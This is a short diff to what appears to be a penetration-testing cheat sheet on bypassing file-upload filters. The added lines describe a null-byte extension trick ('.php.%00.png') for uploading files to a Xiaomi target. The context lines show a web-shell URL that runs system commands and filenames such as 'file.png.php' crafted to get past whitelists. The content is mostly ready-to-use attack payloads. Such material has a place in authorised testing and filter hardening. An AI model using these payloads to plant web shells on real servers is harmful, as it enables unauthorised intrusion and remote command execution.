@@ -11,6 +11,14 @@ Perl → .pl, .cgi
 #http://target.com/path/to/shell.php?__=system&___=ls
 
 
+
+Bypass file upload on xiaomi With this method
+.extentions./%00.png
+Example :
+.php.%00.png
+
+
+
 # Whitelisting Bypass
 file.png.php
 file.png.Php5
